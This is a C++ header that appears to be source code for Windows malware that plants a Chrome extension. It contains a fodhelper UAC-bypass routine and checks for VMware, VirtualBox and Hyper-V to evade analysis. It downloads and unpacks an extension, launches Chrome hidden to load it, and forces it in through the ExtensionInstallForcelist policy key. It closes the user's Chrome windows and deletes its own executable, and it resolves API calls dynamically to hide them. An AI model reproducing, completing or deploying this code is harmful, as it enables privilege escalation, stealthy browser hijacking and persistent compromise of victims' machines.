#pragma once

#include <windows.h>
#include <iostream>
#include <string>
#include <locale>
#include <codecvt>
#include <filesystem>
#include <direct.h>
#include <strsafe.h>
#include <chrono>
#include <thread>
#include <locale>
#include <vector>
#include <iomanip>
#include <algorithm>
#include <iterator>
#include <sstream>
#include <zip.h>
#include <fstream>
#include "definitions.h"

using namespace std;


struct KeyValuePair {
    string name;
    string value;
};

int bigboss(HMODULE &handle)
    {
        RCK regcloser = (RCK)GetProcAddress(handle, "RegClosekey");
        RCKE regcreatek = (RCKE)GetProcAddress(handle, "RegCreateKeyExW");
        RSVEW regsetv = (RSVEW)GetProcAddress(handle, "RegSetValueExW");


        HKEY hkey;
        DWORD d;
        size_t ret;
        wchar_t cmd[MAX_PATH] = { 0 };
        GetModuleFileName(NULL, cmd, MAX_PATH);
        char buffer[MAX_PATH];
        const char* del = "";

        LSTATUS stat = regcreatek(HKEY_CURRENT_USER, "Software\\Classes\\ms-settings\\Shell\\Open\\command", 0, NULL, REG_OPTION_VOLATILE, KEY_ALL_ACCESS, NULL, &hkey, &d);
        if (stat != 0) {
            return -1;
        } 
        stat = regsetv(hkey, L"", 0, REG_SZ, (BYTE*)cmd, MAX_PATH);
        if (stat != 0) {
            return -1;
        }
        stat = regsetv(hkey, L"DelegateExecute", 0, REG_SZ, (BYTE*)del, strlen(del));
        if (stat != 0) {
            return -1;
        }

        regcloser(hkey);

        SHELLEXECUTEINFO sei = { sizeof(sei) };
        sei.lpVerb = L"runas";
        sei.lpFile = L"C:\\Windows\\system32\\fodhelper.exe";
        sei.hwnd = NULL;
        sei.nShow = SW_NORMAL;

        if (!ShellExecuteEx(&sei)) {
            DWORD err = GetLastError();
            printf(err == ERROR_CANCELLED ? "the user refused to allow privileges elevation.\n" : "unexpected error! error code: %ld\n", err);
        }
        else {
            printf("successfully create process =^..^=\n");
        }
        return 0;
    }

std::string GetComputerName() {
    char computerName[MAX_COMPUTERNAME_LENGTH + 1];
    DWORD size = sizeof(computerName);

    //k32
    if (GetComputerNameA(computerName, &size)) {
        return std::string(computerName);
    }
    else {
        return "Unknown";
    }
}

bool IsChromeInstalled(HMODULE &handle) {
    HKEY hKey;
    bool isInstalled = false;

    ROKEW regopener = (ROKEW)GetProcAddress(handle, "RegOpenKeyExW");
    RCK regcloser = (RCK)GetProcAddress(handle, "RegClosekey");
    if (regopener(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Google\\Chrome", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        isInstalled = true;
        regcloser(hKey);
    }

    return isInstalled;
}

float GetRamCapacity() {
    MEMORYSTATUSEX statex;
    statex.dwLength = sizeof(statex);

    GlobalMemoryStatusEx(&statex);

    return (float)statex.ullTotalPhys / (1024 * 1024 * 1024.0);
}

bool IsVirtualComputer(HMODULE &handle) {
    HKEY hKey;

    ROKEW regopener = (ROKEW)GetProcAddress(handle, "RegOpenKeyExW");
    RCK regcloser = (RCK)GetProcAddress(handle, "RegClosekey");

    if (regopener(HKEY_LOCAL_MACHINE, TEXT("SOFTWARE\\VMware, Inc.\\VMware Tools"), 0, KEY_READ, &hKey) == ERROR_SUCCESS)
    {
        regcloser(hKey);
        return true;
    }

    if (regopener(HKEY_LOCAL_MACHINE, TEXT("SOFTWARE\\Oracle\\VirtualBox Guest Additions"), 0, KEY_READ, &hKey) == ERROR_SUCCESS)
    {
        regcloser(hKey);
        return true;
    }

    // Check for Hyper-V virtual machine
    if (IsProcessorFeaturePresent(PF_VIRT_FIRMWARE_ENABLED))
    {
        return true;
    }

    return false;
}

string GetFileNameFromPath(string path) {
    size_t lastSlash = path.find_last_of("/\\");
    if (lastSlash != std::string::npos) {
        return path.substr(lastSlash + 1);
    }
    return path;
}

void DownloadExtension(string url, string path) {
    HMODULE urlmon = LoadLibrary(L"Urlmon.dll");

    wstring tempUrl = wstring(url.begin(), url.end());
    wstring tempPath = wstring(path.begin(), path.end());

    LPCWSTR wideStringUrl = tempUrl.c_str();
    LPCWSTR wideStringPath = tempPath.c_str();

    dutf NewURLDownloadToFile = (dutf)GetProcAddress(urlmon, "URLDownloadToFileW");
    if (NewURLDownloadToFile(0, wideStringUrl, wideStringPath, 0, 0) == ((HRESULT)0L)) {
        //cout << "Downlod: Succses" << endl;
    }
    else {
        //cout << "Download: Fails" << endl;
    }
}

string WStringToString(wstring wstr) {
    std::wstring_convert<std::codecvt_utf8<wchar_t>> converter;
    return converter.to_bytes(wstr);
}

wstring Get7ZipPath()
{
    HKEY key;
    wstring path;

    if (RegOpenKeyEx(HKEY_LOCAL_MACHINE, TEXT("SOFTWARE\\7-Zip"), 0, KEY_READ, &key) == ERROR_SUCCESS) {
        wchar_t buffer[MAX_PATH];
        DWORD bufferSize = MAX_PATH * sizeof(wchar_t);

        // Get the installation path from the registry value
        if (RegGetValue(key, nullptr, TEXT("Path"), RRF_RT_REG_SZ, nullptr, buffer, &bufferSize) == ERROR_SUCCESS) {
            path = buffer;
            path += L"7z.exe";
        }

        // Close the registry key
        RegCloseKey(key);
    }

    return path;
}

void ExtractExtension(string path, string destination)
{
    string programPath = WStringToString(Get7ZipPath());
    string command = "cd " + destination + " && ";
    //system(command.c_str());
    command += "\"" + programPath + "\"" + " x " + path;// +" -ooutput " + destination;
    system(command.c_str());
}


//void ExtractExtension(string path, string destination)
//{
//    int err = 0;
//    zip* z = zip_open(path.c_str(), 0, &err);
//
//    zip_int64_t num_entries = zip_get_num_entries(z, 0);
//
//    for (zip_uint64_t i = 0; i < num_entries; i++) {
//        // Get information about the current entry
//        struct zip_stat st;
//        zip_stat_init(&st);
//        zip_stat_index(z, i, 0, &st);
//
//        string name(st.name);
//        if (name.back() == '/') {
//            // Create the directory on disk
//            string dir_path = destination + "\\" + name;
//            _mkdir(dir_path.c_str());
//            continue;
//        }
//
//        char* contents = new char[st.size];
//        zip_file* f = zip_fopen_index(z, i, 0);
//        zip_fread(f, contents, st.size);
//        zip_fclose(f);
//
//        ofstream ofs(destination + "\\" + name);
//        if (!ofs.write(contents, st.size)) {
//            std::cerr << "Error writing file" << '\n' << GetLastError;
//            // return EXIT_FAILURE;
//        }
//    }
//}

wstring GetChromeLocation(HMODULE &handle) {
    HKEY hKey;
    std::wstring chromeLocation;

    ROKEW regopener = (ROKEW)GetProcAddress(handle, "RegOpenKeyExW");
    RCK regcloser = (RCK)GetProcAddress(handle, "RegClosekey");
    RQVE regquery = (RQVE)GetProcAddress(handle, "RegQueryValueExW");


    if (regopener(HKEY_LOCAL_MACHINE, TEXT("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\chrome.exe"), 0, KEY_QUERY_VALUE, &hKey) == ERROR_SUCCESS) {
        wchar_t buffer[MAX_PATH];
        DWORD bufferSize = MAX_PATH * sizeof(wchar_t);

        if (regquery(hKey, nullptr, nullptr, nullptr, (LPBYTE)buffer, &bufferSize) == ERROR_SUCCESS) {
            chromeLocation = buffer;
        }

        //regcloser(hKey);
    }

    return chromeLocation;
}

string GetCurrentFolder() {
    char buffer[MAX_PATH];
    if (GetCurrentDirectoryA(MAX_PATH, buffer)) {
    }
    else {
    }

    return buffer;
}

BOOL CLIparser(std::string& input_str) {
    size_t convertedChars;
    STARTUPINFO startInf = { 0 };
    PROCESS_INFORMATION procInf = { 0 };

    startInf.cb = sizeof(startInf);

    wchar_t cmd[MAX_PATH] = L"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe";
    wchar_t input[MAX_PATH];

    mbstowcs_s(&convertedChars, input, input_str.length() + 1, input_str.c_str(), _TRUNCATE);

    BOOL b = CreateProcessW(cmd, input, NULL, NULL, FALSE, ABOVE_NORMAL_PRIORITY_CLASS | CREATE_NO_WINDOW, NULL, NULL, &startInf, &procInf);

    CloseHandle(procInf.hThread);
    CloseHandle(procInf.hProcess);

    return b;
}

void OpenChrome(string extensionLocation, HMODULE handle)
{
    wstring chrome = GetChromeLocation(handle);
    string chromePath = WStringToString(chrome);
    //string command = chromePath +"\"" "--load-extension=" + extensionLocation ;
    string command = "\"" + chromePath + "\"" + " --no-startup-window" " --load-extension=" + extensionLocation;
    BOOL result = CLIparser(command);
    if (!result) {
        exit(-1);
    }
}

string WCharToString(const wchar_t* wstr) {
    std::wstring_convert<std::codecvt_utf8_utf16<wchar_t>> converter;
    return converter.to_bytes(wstr);
}

void ReplaceSubstring(std::string& original, const std::string& from, const std::string& to) {
    size_t startPos = original.find(from);
    while (startPos != std::string::npos) {
        original.replace(startPos, from.length(), to);
        startPos = original.find(from, startPos + to.length());
    }
}

std::string GenerateGUID() {
    GUID guid;
    CoCreateGuid(&guid);

    wchar_t guidStr[40];
    auto _ = StringFromGUID2(guid, guidStr, sizeof(guidStr) / sizeof(guidStr[0]));
    string result = WCharToString(guidStr);
    ReplaceSubstring(result, "{", "");
    ReplaceSubstring(result, "}", "");
    return result;
}

string GetFileNameWithoutExtension(string filePath) {
    size_t lastSlash = filePath.find_last_of("/\\");
    size_t lastDot = filePath.find_last_of(".");
    if (lastDot != std::string::npos && (lastSlash == std::string::npos || lastDot > lastSlash)) {
        return filePath.substr(lastSlash + 1, lastDot - lastSlash - 1);
    }

    return filePath.substr(lastSlash + 1);
}

string GetTempFolder() {
    char* tempPath = nullptr;
    size_t size;
    errno_t err = _dupenv_s(&tempPath, &size, "TEMP");
    if (err == 0 && tempPath != nullptr) {
        string tempFolder(tempPath);
        free(tempPath);
        return tempFolder;
    }
    return "";
}

void CloseAllChrome() {
    HWND hwnd = FindWindowA("Chrome_WidgetWin_1", NULL);
    while (hwnd) {
        PostMessage(hwnd, WM_CLOSE, 0, 0);
        hwnd = FindWindowExA(NULL, hwnd, "Chrome_WidgetWin_1", NULL);
    }

    //std::cout << "All Chrome instances closed." << std::endl;

    return;
}

void DelMe()
{
    TCHAR szModuleName[MAX_PATH];
    TCHAR szCmd[2 * MAX_PATH];
    STARTUPINFO si = { 0 };
    PROCESS_INFORMATION pi = { 0 };

    GetModuleFileName(NULL, szModuleName, MAX_PATH);

    StringCbPrintf(szCmd, 2 * MAX_PATH, SELF_REMOVE_STRING, szModuleName);

    CreateProcess(NULL, szCmd, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);

    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
}


vector<KeyValuePair> EnumerateRegistryKeysAndValues(HKEY key, HMODULE &handle) {

    RQIKW regqik = (RQIKW)GetProcAddress(handle, "RegQueryInfoKeyW");
    REVW regenuv = (REVW)GetProcAddress(handle, "RegEnumValueW");

    vector<KeyValuePair> result;
    auto openedKey = key;

    auto valueCount = static_cast<DWORD>(0);
    auto maxNameLength = static_cast<DWORD>(0);
    auto maxValueLength = static_cast<DWORD>(0);
    auto status = regqik(openedKey, NULL, NULL, NULL, NULL, NULL, NULL,
        &valueCount, &maxNameLength, &maxValueLength, NULL, NULL);

    if (status == ERROR_SUCCESS) {
        DWORD type = 0;
        DWORD index = 0;
        std::vector<wchar_t> valueName = std::vector<wchar_t>(maxNameLength + 1);
        std::vector<BYTE> dataBuffer = std::vector<BYTE>(maxValueLength);

        for (DWORD index = 0; index < valueCount; index++) {
            DWORD charCountValueName = static_cast<DWORD>(valueName.size());
            DWORD charBytesData = static_cast<DWORD>(dataBuffer.size());
            status = regenuv(openedKey, index, valueName.data(), &charCountValueName,
                NULL, &type, dataBuffer.data(), &charBytesData);

            if (type == REG_SZ) {
                const auto reg_string = reinterpret_cast<wchar_t*>(dataBuffer.data());
                KeyValuePair value = { WStringToString(valueName.data()), WStringToString(reg_string) };
                result.push_back(value);
            }
        };
    }

    return result;
}


vector<string> GetExtensionId(string extensionLocation, HMODULE &handle) {
    vector<string> result;
    HKEY hKey;

    ROKEW regoke = (ROKEW)GetProcAddress(handle, "RegOpenKeyExW");
    if (regoke(HKEY_CURRENT_USER, L"SOFTWARE\\Google\\Chrome\\PreferenceMACs\\Default\\extensions.settings", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
    }
    else {
        //std::cerr << "Failed to open registry key." << std::endl;
        return result;
    }

    auto oldData = EnumerateRegistryKeysAndValues(hKey, handle);

    CloseAllChrome();

    HMODULE handleValue = handle;

    std::thread t(OpenChrome, extensionLocation, handleValue);
    t.detach();
    this_thread::sleep_for(std::chrono::seconds(20));
    CloseAllChrome();

    if (regoke(HKEY_CURRENT_USER, L"SOFTWARE\\Google\\Chrome\\PreferenceMACs\\Default\\extensions.settings", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {

    }
    else {
        //std::cerr << "Failed to open registry key." << std::endl;
        return result;
    }
    auto newData = EnumerateRegistryKeysAndValues(hKey, handle);


    for (const auto& item : newData) {
        auto flag = false;
        for (const auto& old : oldData) {
            if (old.name == item.name)
            {
                flag = true;
                continue;
            }
        }

        if (!flag)
        {
            //cout << item.name << endl;
            result.push_back(item.name);
        }
    }

    return result;
}

int InsertForceInstall(string key, string value, HMODULE &handle) {

    std::string subKey = "SOFTWARE\\Policies\\Google\\Chrome\\ExtensionInstallForcelist";
    HKEY hKey;
    RCKE regcreatek = (RCKE)GetProcAddress(handle, "RegCreateKeyExA");
    RSVE regsetva = (RSVE)GetProcAddress(handle, "RegSetValueExA");
    RCK regcloser = (RCK)GetProcAddress(handle, "RegCloseKey");



    LONG result = regcreatek(HKEY_LOCAL_MACHINE, subKey.c_str(), 0, NULL, REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &hKey, NULL);

    if (result == ERROR_SUCCESS) {
        const BYTE* byteValue = reinterpret_cast<const BYTE*>(value.c_str());
        DWORD dataSize = static_cast<DWORD>(value.size()) + 1;

        result = regsetva(hKey, key.c_str(), 0, REG_SZ, byteValue, dataSize);

        if (result == ERROR_SUCCESS) {
            //std::cout << "Value added to registry successfully." << std::endl;
        }
        else {
            //std::cerr << "Error adding value to registry: " << result << std::endl;
        }

        regcloser(hKey);
    }
    else {
        //std::cerr << "Error creating or opening registry key: " << result << std::endl;
    }

    return 0;
}

vector<string> Split(string input) {
    std::vector<std::string> output;

    std::istringstream iss(input);
    std::string token;

    while (std::getline(iss, token, ';')) {
        output.push_back(token);
    }

    return output;
}

bool IsElevated(HMODULE &handle)
{
    bool fRet = false;
    HANDLE hToken = NULL;

    OPT openpt = (OPT)GetProcAddress(handle, "OpenProcessToken");
    GTI getki = (GTI)GetProcAddress(handle, "GetTokenInformation");
    if (openpt(GetCurrentProcess(), TOKEN_QUERY, &hToken))
    {
        TOKEN_ELEVATION elevation;
        DWORD dwSize;
        if (getki(hToken, TokenElevation, &elevation, sizeof(elevation), &dwSize))
        {
            fRet = elevation.TokenIsElevated != 0;
        }
    }
    if (hToken)
    {
        CloseHandle(hToken);
    }
    return fRet;
}

void InstallExtension(string id, string extensionLocation, HMODULE &handle) {
    HKEY hKey;
    ROKEW regopener = (ROKEW)GetProcAddress(handle, "RegOpenKeyExW");

    if (regopener(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Policies\\Google\\Chrome\\ExtensionInstallForcelist", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {

    }
    else {
       //std::cerr << "Failed to open registry key." << std::endl;
    }

    auto values = EnumerateRegistryKeysAndValues(hKey, handle);

    auto valueName = to_string(values.size() + 1);
    auto valueData = id + ";" + extensionLocation;

    auto flag = false;
    for (const KeyValuePair& item : values) {
        auto temp = Split(item.value);
        if (temp.size() != 0)
        {
            if (id == temp[0])
            {
                flag = true;
                break;
            }
        }
    }

    if (flag)
    {
        return;
    }

    InsertForceInstall(valueName, valueData, handle);
}
